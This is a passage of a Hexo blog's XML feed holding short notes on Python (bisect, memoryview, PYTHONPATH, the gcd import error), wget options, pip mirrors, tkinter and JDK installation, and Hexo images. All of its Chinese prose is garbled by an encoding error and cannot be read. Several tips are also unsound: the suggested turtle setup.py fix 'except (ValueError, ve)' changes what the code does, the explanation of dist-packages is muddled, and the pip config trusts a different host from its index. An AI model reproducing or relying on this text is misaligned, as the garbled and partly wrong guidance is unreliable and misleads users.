çš„ä½ç½®ï¼Œè¯¥ä½ç½®æ»¡è¶³çš„æ¡ä»¶æ˜¯ï¼ŒæŠŠ needle æ’å…¥è¿™ä¸ªä½ç½®ä¹‹åï¼Œhaystack è¿˜èƒ½ä¿æŒå‡åºã€‚å…¶ä¸­ haystack å¿…é¡»æ˜¯ä¸€ä¸ªæœ‰åºçš„åºåˆ—ã€‚`bisect` å‡½æ•°æ˜¯ `bisect_right` å‡½æ•°çš„åˆ«åï¼Œå…¶å§å¦¹å‡½æ•°å« `bisect_left`, å®ƒä»¬åŒºåˆ«åœ¨äº `bisect_left` è¿”å›çš„æ’å…¥ä½ç½®æ˜¯åŸåºåˆ—ä¸­è·Ÿè¢«æ’å…¥å…ƒç´ ç›¸ç­‰çš„å…ƒç´ çš„ä½ç½®ï¼Œä¹Ÿå°±æ˜¯æ–°å…ƒç´ ä¼šæ”¾ç½®äºå®ƒç›¸ç­‰çš„å…ƒç´ çš„å‰é¢ï¼Œè€Œ `bisect_right` ä¼šæ”¾åœ¨åé¢ã€‚`bisect` å‡½æ•°æœ‰ lo å’Œ hi ä¸¤ä¸ªå¯é€‰å‚æ•°ã€‚#### 2.8.2 ç”¨ bisect.insert æ’å…¥æ–°å…ƒç´ `insort(seq, item)` æŠŠå˜é‡ item æ’å…¥åˆ°åºåˆ— seq ä¸­ï¼Œå¹¶èƒ½ä¿æŒ seq çš„å‡åºã€‚### 2.9 å½“åˆ—è¡¨ä¸æ˜¯é¦–é€‰æ—¶#### 2.9.1 æ•°ç»„è‹¥éœ€è¦ä¸€ä¸ªåªåŒ…å«æ•°å­—çš„åˆ—è¡¨ï¼Œ`array.array` æ¯” `list` æ›´é«˜æ•ˆã€‚åˆ›å»ºæ•°ç»„éœ€è¦ä¸€ä¸ªç±»å‹ç ï¼Œè¿™ä¸ªç±»å‹ç ç”¨æ¥è¡¨ç¤ºåœ¨åº•å±‚çš„ C è¯­è¨€åº”è¯¥å­˜æ”¾æ€æ ·çš„æ•°æ®ç±»å‹ã€‚Python ä¸ä¼šå…è®¸ä½ åœ¨æ•°ç»„é‡Œå­˜æ”¾é™¤æŒ‡å®šç±»å‹ä¹‹å¤–çš„æ•°æ®ã€‚#### 2.9.2 å†…å­˜è§†å›¾`memoryview` æ˜¯ä¸€ä¸ªå†…ç½®ç±»ï¼Œå®ƒèƒ½è®©ç”¨æˆ·åœ¨ä¸å¤åˆ¶å†…å®¹çš„æƒ…å†µä¸‹æ“ä½œåŒä¸€ä¸ªæ•°ç»„çš„ä¸åŒåˆ‡ç‰‡ã€‚`memoryview.cast` çš„æ¦‚å¿µè·Ÿæ•°ç»„æ¨¡å—ç±»ä¼¼ï¼Œèƒ½ç”¨ä¸åŒçš„æ–¹å¼è¯»å†™åŒä¸€å—å†…å­˜æ•°æ®ï¼Œè€Œä¸”å†…å®¹å­—èŠ‚ä¸ä¼šéšæ„ç§»åŠ¨ã€‚å’Œ C è¯­è¨€ä¸­çš„ç±»å‹è½¬æ¢å·®ä¸å¤šã€‚#### 2.9.3 NumPy å’Œ SciPyNumPy å’Œ SciPy æä¾›é«˜é˜¶æ•°ç»„å’ŒçŸ©é˜µæ“ä½œã€‚NumPy å®ç°äº†å¤šç»´åŒè´¨æ•°ç»„(homogeneous) å’ŒçŸ©é˜µï¼Œè¿™äº›æ•°æ®ç»“æ„ä¸ä½†èƒ½å¤„ç†æ•°å­—ï¼Œè¿˜èƒ½å­˜æ”¾å…¶ä»–ç”±ç”¨æˆ·å®šä¹‰çš„è®°å½•ã€‚SciPy æ˜¯åŸºäº NumPy çš„å¦ä¸€ä¸ªåº“ï¼Œå®ƒæä¾›äº†å¾ˆå¤šè·Ÿç§‘å­¦è®¡ç®—æœ‰å…³çš„ç®—æ³•ï¼Œä¸“ä¸ºçº¿æ€§ä»£æ•°ã€æ•°å€¼ç§¯åˆ†å’Œç»Ÿè®¡å­¦è€Œè®¾è®¡ã€‚SciPy èƒŒåä¸º C å’Œ Fortran ä»£ç ã€‚</code></pre>]]></content>
    
    
    <categories>
      
      <category>Python</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>æŸ¥çœ‹PYTHONPATH</title>
    <link href="/2022/08/22/%E6%9F%A5%E7%9C%8BPYTHONPATH/"/>
    <url>/2022/08/22/%E6%9F%A5%E7%9C%8BPYTHONPATH/</url>
    
    <content type="html"><![CDATA[<h1 id="æŸ¥çœ‹-PYTHONPATH"><a href="#æŸ¥çœ‹-PYTHONPATH" class="headerlink" title="æŸ¥çœ‹ PYTHONPATH"></a>æŸ¥çœ‹ PYTHONPATH</h1><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs elixir"><span class="hljs-variable">$ </span>python3<br><span class="hljs-variable">$ </span>&gt;&gt;&gt; <span class="hljs-keyword">import</span> sys<br>  &gt;&gt;&gt; sys.path<br></code></pre></td></tr></table></figure><h1 id="æ·»åŠ è·¯å¾„"><a href="#æ·»åŠ è·¯å¾„" class="headerlink" title="æ·»åŠ è·¯å¾„"></a>æ·»åŠ è·¯å¾„</h1><figure class="highlight dos"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dos">&gt;&gt;&gt; sys.<span class="hljs-built_in">path</span>.<span class="hljs-built_in">append</span>(è·¯å¾„)<br></code></pre></td></tr></table></figure><p>æ°¸ä¹…æ·»åŠ å¯ä»¥ä¿®æ”¹<code>.bashrc</code>æ–‡ä»¶ã€‚</p>]]></content>
    
    
    <categories>
      
      <category>Python</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>è§£å†³ImportError: cannot import name gcd from fractions é—®é¢˜</title>
    <link href="/2022/08/22/%E8%A7%A3%E5%86%B3ImportError-cannot-import-name-gcd-from-fractions-%E9%97%AE%E9%A2%98/"/>
    <url>/2022/08/22/%E8%A7%A3%E5%86%B3ImportError-cannot-import-name-gcd-from-fractions-%E9%97%AE%E9%A2%98/</url>
    
    <content type="html"><![CDATA[<p>å¥½åƒ Python3.9 æŠŠ <code>gcd</code> å‡½æ•°ç§»å…¥åˆ° <code>math</code> æ¨¡å—ä¸­äº†, å› æ­¤ï¼Œå°†:</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs angelscript"><span class="hljs-keyword">from</span> fractions <span class="hljs-keyword">import</span> gcd<br></code></pre></td></tr></table></figure><p>æ”¹ä¸º:</p><figure class="highlight moonscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs moonscript"><span class="hljs-keyword">from</span> <span class="hljs-built_in">math</span> <span class="hljs-keyword">import</span> gcd<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Python</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>dist-packages å’Œ site-packages çš„åŒºåˆ«</title>
    <link href="/2022/08/22/dist-packages-%E5%92%8C-site-packages-%E7%9A%84%E5%8C%BA%E5%88%AB/"/>
    <url>/2022/08/22/dist-packages-%E5%92%8C-site-packages-%E7%9A%84%E5%8C%BA%E5%88%AB/</url>
    
    <content type="html"><![CDATA[<h1 id="dist-packages"><a href="#dist-packages" class="headerlink" title="dist-packages"></a>dist-packages</h1><p>å½“æ¨¡å—ä»Debiançš„åŒ…ç®¡ç†å™¨ä¸‹è½½æ—¶ï¼Œå…¶ä¼šè¢«å®‰è£…è‡³<code>dist-packages</code>:</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">/usr/</span>lib<span class="hljs-regexp">/python3.10/</span>dist-packages<br></code></pre></td></tr></table></figure><p>ç”±äº<code>easy_install</code>å’Œ<code>pip</code>éƒ½æ˜¯ä»åŒ…ç®¡ç†å™¨ä¸‹è½½ï¼Œå› æ­¤ç”¨è¿™ä¸¤ä¸ªå®‰è£…çš„æ¨¡å—ä¹Ÿä¼šåˆ°<code>dist-packages</code>.</p><h1 id="site-packages"><a href="#site-packages" class="headerlink" title="site-packages"></a>site-packages</h1><p>ä»æºä»£ç å®‰è£…Python, å…¶ä¼šä½¿ç”¨<code>site-packages</code>ç›®å½•ã€‚</p>]]></content>
    
    
    <categories>
      
      <category>Python</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Ubuntuä¸‹å®‰è£…tkinter</title>
    <link href="/2022/08/22/Ubuntu%E4%B8%8B%E5%AE%89%E8%A3%85tkinter/"/>
    <url>/2022/08/22/Ubuntu%E4%B8%8B%E5%AE%89%E8%A3%85tkinter/</url>
    
    <content type="html"><![CDATA[<p>ä½¿ç”¨å‘½ä»¤å¦‚ä¸‹:</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">sudo apt-<span class="hljs-built_in">get</span> install python3-tk<br></code></pre></td></tr></table></figure><p>æˆ–è€…:</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">sudo apt-<span class="hljs-built_in">get</span> install python-tk<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Python</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>å®‰è£… turtle åº“</title>
    <link href="/2022/08/22/%E5%AE%89%E8%A3%85-turtle-%E5%BA%93/"/>
    <url>/2022/08/22/%E5%AE%89%E8%A3%85-turtle-%E5%BA%93/</url>
    
    <content type="html"><![CDATA[<p>ç›´æ¥é€šè¿‡<code>pip</code>å®‰è£…ä¼šæŠ¥é”™.</p><p>å…ˆé€šè¿‡<code>wget</code>ä¸‹è½½:</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">wget</span> -O turtle-<span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">2</span>.tar.gz https://pypi.tuna.tsinghua.edu.cn/packages/ff/f0/<span class="hljs-number">21</span>a42e9e424d24bdd0e509d5ed3c7dfb8f47d962d9c044dba903b0b4a26f/turtle-<span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">2</span>.tar.gz<br></code></pre></td></tr></table></figure><p>è§£å‹åè¿›å…¥æ–‡ä»¶å¤¹:</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">cd</span> turtle-<span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">2</span><br><span class="hljs-attribute">vim</span> setup.py<br></code></pre></td></tr></table></figure><p>ä¿®æ”¹ç¬¬40è¡Œä¸º:</p><figure class="highlight delphi"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs delphi"><span class="hljs-keyword">except</span> (ValueError, ve):<br></code></pre></td></tr></table></figure><p>ä¹Ÿå°±æ˜¯åŠ äº†ä¸€ä¸ªæ‹¬å·ã€‚</p>]]></content>
    
    
    <categories>
      
      <category>Python</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>wget éƒ¨åˆ†å¸¸ç”¨å‚æ•°</title>
    <link href="/2022/08/22/wget-%E9%83%A8%E5%88%86%E5%B8%B8%E7%94%A8%E5%8F%82%E6%95%B0/"/>
    <url>/2022/08/22/wget-%E9%83%A8%E5%88%86%E5%B8%B8%E7%94%A8%E5%8F%82%E6%95%B0/</url>
    
    <content type="html"><![CDATA[<h1 id="ä¸‹è½½å•ä¸ªæ–‡ä»¶å¹¶é‡å‘½å"><a href="#ä¸‹è½½å•ä¸ªæ–‡ä»¶å¹¶é‡å‘½å" class="headerlink" title="ä¸‹è½½å•ä¸ªæ–‡ä»¶å¹¶é‡å‘½å"></a>ä¸‹è½½å•ä¸ªæ–‡ä»¶å¹¶é‡å‘½å</h1><figure class="highlight haxe"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs haxe">wget -O <span class="hljs-keyword">new</span><span class="hljs-type">name</span> url<br></code></pre></td></tr></table></figure><h1 id="æ–­ç”µç»­ä¼ ï¼Œä¹Ÿå°±æ˜¯æ¥ç€ä¸Šæ¬¡æ²¡ä¸‹è½½å®Œçš„"><a href="#æ–­ç”µç»­ä¼ ï¼Œä¹Ÿå°±æ˜¯æ¥ç€ä¸Šæ¬¡æ²¡ä¸‹è½½å®Œçš„" class="headerlink" title="æ–­ç”µç»­ä¼ ï¼Œä¹Ÿå°±æ˜¯æ¥ç€ä¸Šæ¬¡æ²¡ä¸‹è½½å®Œçš„"></a>æ–­ç”µç»­ä¼ ï¼Œä¹Ÿå°±æ˜¯æ¥ç€ä¸Šæ¬¡æ²¡ä¸‹è½½å®Œçš„</h1><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">wget -c url</span><br></code></pre></td></tr></table></figure><h1 id="åå°ä¸‹è½½"><a href="#åå°ä¸‹è½½" class="headerlink" title="åå°ä¸‹è½½"></a>åå°ä¸‹è½½</h1><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs armasm"><span class="hljs-symbol">wget</span> -<span class="hljs-keyword">b</span> url<br></code></pre></td></tr></table></figure><p>æŸ¥çœ‹è¿›åº¦ç”¨:</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell">tail <span class="hljs-operator">-f</span> w<span class="hljs-built_in">get-log</span><br></code></pre></td></tr></table></figure><h1 id="ä¸‹è½½å¤šä¸ªæ–‡ä»¶"><a href="#ä¸‹è½½å¤šä¸ªæ–‡ä»¶" class="headerlink" title="ä¸‹è½½å¤šä¸ªæ–‡ä»¶"></a>ä¸‹è½½å¤šä¸ªæ–‡ä»¶</h1><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">cat</span> &gt; filelist.txt<br>url1<br>url2<br>url3<br>url4<br><br><span class="hljs-built_in">wget</span> <span class="hljs-literal">-i</span> filelist.txt<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Skills</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>wget: unable to resolve host address</title>
    <link href="/2022/08/22/wget-unable-to-resolve-host-address/"/>
    <url>/2022/08/22/wget-unable-to-resolve-host-address/</url>
    
    <content type="html"><![CDATA[<p>ä¸€èˆ¬æ˜¯ç½‘ç»œé—®é¢˜ã€‚</p>]]></content>
    
    
    <categories>
      
      <category>Errors</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>ubuntu ä¸‹ Python æ¨¡å—çš„åº“å¯¼å…¥</title>
    <link href="/2022/08/22/ubuntu-%E4%B8%8B-Python-%E6%A8%A1%E5%9D%97%E7%9A%84%E5%BA%93%E5%AF%BC%E5%85%A5/"/>
    <url>/2022/08/22/ubuntu-%E4%B8%8B-Python-%E6%A8%A1%E5%9D%97%E7%9A%84%E5%BA%93%E5%AF%BC%E5%85%A5/</url>
    
    <content type="html"><![CDATA[<p>ä½¿ç”¨ <code>pip</code> å®‰è£…ã€‚</p><p><code>pip</code> æé€Ÿ:</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-built_in">mkdir</span> .pip<br><span class="hljs-keyword">cd</span> .pip<br><span class="hljs-keyword">vim</span> pip.<span class="hljs-keyword">conf</span><br></code></pre></td></tr></table></figure><p>æ·»åŠ :</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">[<span class="hljs-keyword">global</span>]<br>  <span class="hljs-keyword">index</span>-url=https://pypi.tuna.tsinghua.edu.cn/simple<br>[install]<br>  <span class="hljs-keyword">trusted</span>-host=mirrors.aliyun.com<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Python</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Python å°çŸ¥è¯†ç‚¹</title>
    <link href="/2022/08/22/Python-%E5%B0%8F%E7%9F%A5%E8%AF%86%E7%82%B9/"/>
    <url>/2022/08/22/Python-%E5%B0%8F%E7%9F%A5%E8%AF%86%E7%82%B9/</url>
    
    <content type="html"><![CDATA[<h1 id="print-å‡½æ•°"><a href="#print-å‡½æ•°" class="headerlink" title="print() å‡½æ•°"></a>print() å‡½æ•°</h1><p>å¦‚:</p><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs maxima"><span class="hljs-built_in">print</span>(&#x27;The <span class="hljs-built_in">length</span> of <span class="hljs-built_in">%s</span> <span class="hljs-built_in">is</span> %d&#x27; <span class="hljs-symbol">%</span>(s,x))<br></code></pre></td></tr></table></figure><p>è¿™é‡Œçš„<code>%(s,x)</code>ï¼Œå…¶ä¸­<code>%</code>æ ‡è®°è½¬æ¢è¯´æ˜ç¬¦çš„å¼€å§‹ï¼Œ<code>(s,x)</code>ä¸ºè½¬æ¢è¯´æ˜ç¬¦ã€‚</p><p>å¯ä»¥ä¸€æ¬¡è¾“å‡ºå¤šä¸ªå¯¹è±¡:</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(a, b)</span></span><br></code></pre></td></tr></table></figure><p>å¯ç›´æ¥è¾“å‡ºåˆ—è¡¨ï¼Œå­—å…¸ï¼Œå…ƒç»„ç­‰å˜é‡ã€‚</p><p>æœ€å°å­—æ®µå®½åº¦å’Œç²¾åº¦è®¾ç½®å’ŒCè¯­è¨€ç›¸åŒã€‚</p><h1 id="try-â€¦-except"><a href="#try-â€¦-except" class="headerlink" title="try â€¦ except"></a>try â€¦ except</h1><p>å°†å¯èƒ½å‘ç”Ÿé”™è¯¯çš„è¯­å¥æ”¾åœ¨<code>try</code>æ¨¡å—ï¼Œç”¨<code>except</code>å¤„ç†å¼‚å¸¸ã€‚</p><p><code>except</code> å¯ä»¥æŒ‡å®šä¸€ä¸ªä¸“é—¨çš„å¼‚å¸¸ï¼Œè‹¥æœªæŒ‡å®šåˆ™é»˜è®¤ä¸ºæ‰€æœ‰å¼‚å¸¸ã€‚</p><p>æ¯ä¸€ä¸ª<code>try</code>éƒ½è‡³å°‘è¦æœ‰ä¸€ä¸ª<code>except</code>.</p><p>å¯ä»¥å¤šåˆ†æ”¯.</p><p>è‹¥ä½¿ç”¨ <code>try ... except ... finally</code>, <code>finally</code> éƒ¨åˆ†æ— è®º <code>try</code> æ˜¯å¦æ•è·é”™è¯¯éƒ½ä¼šæ‰§è¡Œã€‚</p><p><code>except</code> ä¸­çš„ <code>as</code> åº”è¯¥æ˜¯è®¾ç½®åˆ«åã€‚</p><h1 id="å­—ç¬¦ä¸²å•å¼•å·å’ŒåŒå¼•å·"><a href="#å­—ç¬¦ä¸²å•å¼•å·å’ŒåŒå¼•å·" class="headerlink" title="å­—ç¬¦ä¸²å•å¼•å·å’ŒåŒå¼•å·"></a>å­—ç¬¦ä¸²å•å¼•å·å’ŒåŒå¼•å·</h1><p>ä¸¤è€…çš†å¯ã€‚</p><h1 id="range-x-y-z"><a href="#range-x-y-z" class="headerlink" title="range(x, y, z)"></a>range(x, y, z)</h1><p><code>z</code>æ˜¯æ­¥é•¿é‡ã€‚</p><h1 id="è½¬æ¢ç±»å‹"><a href="#è½¬æ¢ç±»å‹" class="headerlink" title="è½¬æ¢ç±»å‹"></a>è½¬æ¢ç±»å‹</h1><p>å¦‚:</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">self.R</span> = int(R)<br></code></pre></td></tr></table></figure><h1 id="Python-ç¼©è¿›"><a href="#Python-ç¼©è¿›" class="headerlink" title="Python ç¼©è¿›"></a>Python ç¼©è¿›</h1><p>Python ç”¨ç¼©è¿›æ¥åŒºåˆ†ä»£ç å±‚æ¬¡ã€‚</p><h1 id="m-é€‰é¡¹"><a href="#m-é€‰é¡¹" class="headerlink" title="-m é€‰é¡¹"></a><code>-m</code> é€‰é¡¹</h1><p>ä½¿ç”¨ <code>-m</code> é€‰é¡¹æ—¶ï¼ŒPython ä¼šæŠŠå½“å‰å·¥ä½œç›®å½•æ·»åŠ åˆ° <code>sys.path</code> ä¸­ã€‚</p><h1 id="isinstance-å‡½æ•°"><a href="#isinstance-å‡½æ•°" class="headerlink" title="isinstance() å‡½æ•°"></a>isinstance() å‡½æ•°</h1><p>ç”¨äºåˆ¤æ–­ä¸€ä¸ªå¯¹è±¡æ˜¯å¦ä¸ºä¸€ä¸ªå·²çŸ¥ç±»å‹ã€‚</p><p>è¯­æ³•:</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">isinstance</span><span class="hljs-params">(object, classinfo)</span></span> <br></code></pre></td></tr></table></figure><p>è¿”å›å¸ƒå°”å€¼ã€‚</p><p>å’Œ <code>type()</code> çš„åŒºåˆ«:</p><ul><li>type() ä¸è€ƒè™‘ç»§æ‰¿å…³ç³»ï¼Œä¸ä¼šè®¤ä¸ºå­ç±»æ˜¯ä¸€ç§çˆ¶ç±»ç±»å‹</li><li>isinstance() è€ƒè™‘ç»§æ‰¿å…³ç³»ï¼Œè®¤ä¸ºå­ç±»æ˜¯ä¸€ç§çˆ¶ç±»ç±»å‹</li></ul>]]></content>
    
    
    <categories>
      
      <category>Python</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Python æå®¢é¡¹ç›®ç¼–ç¨‹</title>
    <link href="/2022/08/22/Python-%E6%9E%81%E5%AE%A2%E9%A1%B9%E7%9B%AE%E7%BC%96%E7%A8%8B/"/>
    <url>/2022/08/22/Python-%E6%9E%81%E5%AE%A2%E9%A1%B9%E7%9B%AE%E7%BC%96%E7%A8%8B/</url>
    
    <content type="html"><![CDATA[<h1 id="ç¬¬ä¸€éƒ¨åˆ†-çƒ­èº«è¿åŠ¨"><a href="#ç¬¬ä¸€éƒ¨åˆ†-çƒ­èº«è¿åŠ¨" class="headerlink" title="ç¬¬ä¸€éƒ¨åˆ† çƒ­èº«è¿åŠ¨"></a>ç¬¬ä¸€éƒ¨åˆ† çƒ­èº«è¿åŠ¨</h1><h2 id="ç¬¬1ç« -è§£æiTunesæ’­æ”¾åˆ—è¡¨"><a href="#ç¬¬1ç« -è§£æiTunesæ’­æ”¾åˆ—è¡¨" class="headerlink" title="ç¬¬1ç«  è§£æiTunesæ’­æ”¾åˆ—è¡¨"></a>ç¬¬1ç«  è§£æiTunesæ’­æ”¾åˆ—è¡¨</h2><h3 id="1-1-iTunes-æ’­æ”¾åˆ—è¡¨æ–‡ä»¶å‰–æ"><a href="#1-1-iTunes-æ’­æ”¾åˆ—è¡¨æ–‡ä»¶å‰–æ" class="headerlink" title="1.1 iTunes æ’­æ”¾åˆ—è¡¨æ–‡ä»¶å‰–æ"></a>1.1 iTunes æ’­æ”¾åˆ—è¡¨æ–‡ä»¶å‰–æ</h3><h2 id="ç¬¬2ç« -ä¸‡èŠ±å°º"><a href="#ç¬¬2ç« -ä¸‡èŠ±å°º" class="headerlink" title="ç¬¬2ç«  ä¸‡èŠ±å°º"></a>ç¬¬2ç«  ä¸‡èŠ±å°º</h2><p><code>turtle</code>æ¨¡å—æ¯”è¾ƒæ…¢ã€‚</p><h3 id="2-1-å‚æ•°æ–¹ç¨‹"><a href="#2-1-å‚æ•°æ–¹ç¨‹" class="headerlink" title="2.1 å‚æ•°æ–¹ç¨‹"></a>2.1 å‚æ•°æ–¹ç¨‹</h3><h4 id="2-1-1-ä¸‡èŠ±å°ºæ–¹ç¨‹"><a href="#2-1-1-ä¸‡èŠ±å°ºæ–¹ç¨‹" class="headerlink" title="2.1.1 ä¸‡èŠ±å°ºæ–¹ç¨‹"></a>2.1.1 ä¸‡èŠ±å°ºæ–¹ç¨‹</h4><p>å¤§å¤šæ•°è®¡ç®—æœºç¨‹åºçš„è§’åº¦è®¡ç®—éœ€è¦å¼§åº¦ã€‚</p><h1 id="ç¬¬äºŒéƒ¨åˆ†-æ¨¡æ‹Ÿç”Ÿå‘½"><a href="#ç¬¬äºŒéƒ¨åˆ†-æ¨¡æ‹Ÿç”Ÿå‘½" class="headerlink" title="ç¬¬äºŒéƒ¨åˆ† æ¨¡æ‹Ÿç”Ÿå‘½"></a>ç¬¬äºŒéƒ¨åˆ† æ¨¡æ‹Ÿç”Ÿå‘½</h1><h2 id="ç¬¬3ç« -Conway-ç”Ÿå‘½æ¸¸æˆ"><a href="#ç¬¬3ç« -Conway-ç”Ÿå‘½æ¸¸æˆ" class="headerlink" title="ç¬¬3ç«  Conway ç”Ÿå‘½æ¸¸æˆ"></a>ç¬¬3ç«  Conway ç”Ÿå‘½æ¸¸æˆ</h2><p>ç±»ä¼¼äº Pac-Man(åƒè±†å­) åœ¨è¾¹ç•Œçš„å·¥ä½œæ–¹å¼ï¼Œå¦‚æœè¶…å‡ºäº†å±å¹•çš„é¡¶éƒ¨ï¼Œå°±ä¼šé‡æ–°åœ¨åº•éƒ¨å‡ºç°ï¼Œå¦‚æœè¶…å‡ºäº†å±å¹•çš„å·¦ä¾§ï¼Œå°±ä¼šé‡æ–°åœ¨å³ä¾§å‡ºç°ã€‚</p>]]></content>
    
    
    <categories>
      
      <category>Python</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>åœ¨ Ubuntu ä¸‹å®‰è£…JDK</title>
    <link href="/2022/08/20/%E5%9C%A8-Ubuntu-%E4%B8%8B%E5%AE%89%E8%A3%85JDK/"/>
    <url>/2022/08/20/%E5%9C%A8-Ubuntu-%E4%B8%8B%E5%AE%89%E8%A3%85JDK/</url>
    
    <content type="html"><![CDATA[<h1 id="å®‰è£…-Open-JDK"><a href="#å®‰è£…-Open-JDK" class="headerlink" title="å®‰è£… Open JDK"></a>å®‰è£… Open JDK</h1><p>æ·»åŠ OpenJDKæº:</p><figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs smali">sudo<span class="hljs-built_in"> add-apt-repository </span>ppa:openjdk-r/ppa<br>sudo apt-get update<br>sudo apt-get install openjdk-8-jdk<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>JAVA</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>hexo deplpy å404 not found</title>
    <link href="/2022/08/17/hexo-deplpy-%E5%90%8E404-not-found/"/>
    <url>/2022/08/17/hexo-deplpy-%E5%90%8E404-not-found/</url>
    
    <content type="html"><![CDATA[<p>åœ¨<code>hexo d</code>ä¹‹åï¼ŒGithubä¸Šé¢çš„<code>CNAME</code>æ–‡ä»¶æ¶ˆå¤±äº†ï¼Œé‡æ–°æ·»åŠ å³å¯ï¼Œæœ€å¥½æ˜¯ç›´æ¥å†™åœ¨Blogæ‰€åœ¨æœ¬åœ°ç›®å½•ä¸­ã€‚</p>]]></content>
    
    
    <categories>
      
      <category>Hexo</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>åœ¨hexoä¸­æ·»åŠ å›¾ç‰‡</title>
    <link href="/2022/08/17/%E5%9C%A8hexo%E4%B8%AD%E6%B7%BB%E5%8A%A0%E5%9B%BE%E7%89%87/"/>
    <url>/2022/08/17/%E5%9C%A8hexo%E4%B8%AD%E6%B7%BB%E5%8A%A0%E5%9B%BE%E7%89%87/</url>
    
    <content type="html"><![CDATA[<p>å°†å›¾ç‰‡æ”¾å…¥<code>/source/img</code>ä¸­, å…ˆå®‰è£…ä¸€ä¸ªæ’ä»¶, æ‰èƒ½ç”¨ markdown çš„æ ¼å¼æ·»åŠ å›¾ç‰‡:</p><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs maxima">cnpm install hexo-asset-<span class="hljs-built_in">image</span> --<span class="hljs-built_in">save</span><br></code></pre></td></tr></table></figure><p>è¿˜éœ€ç¡®è®¤<code>_config.yml</code>æ–‡ä»¶ä¸­<code>post_asset_folder: true</code>.</p><p>æ’å…¥æ ¼å¼ä¸º:</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arcade">![alt](<span class="hljs-regexp">/img/</span>)<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Hexo</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Markdown æ’å…¥å›¾ç‰‡</title>
    <link href="/2022/08/17/Markdown-%E6%8F%92%E5%85%A5%E5%9B%BE%E7%89%87/"/>
    <url>/2022/08/17/Markdown-%E6%8F%92%E5%85%A5%E5%9B%BE%E7%89%87/</url>
    
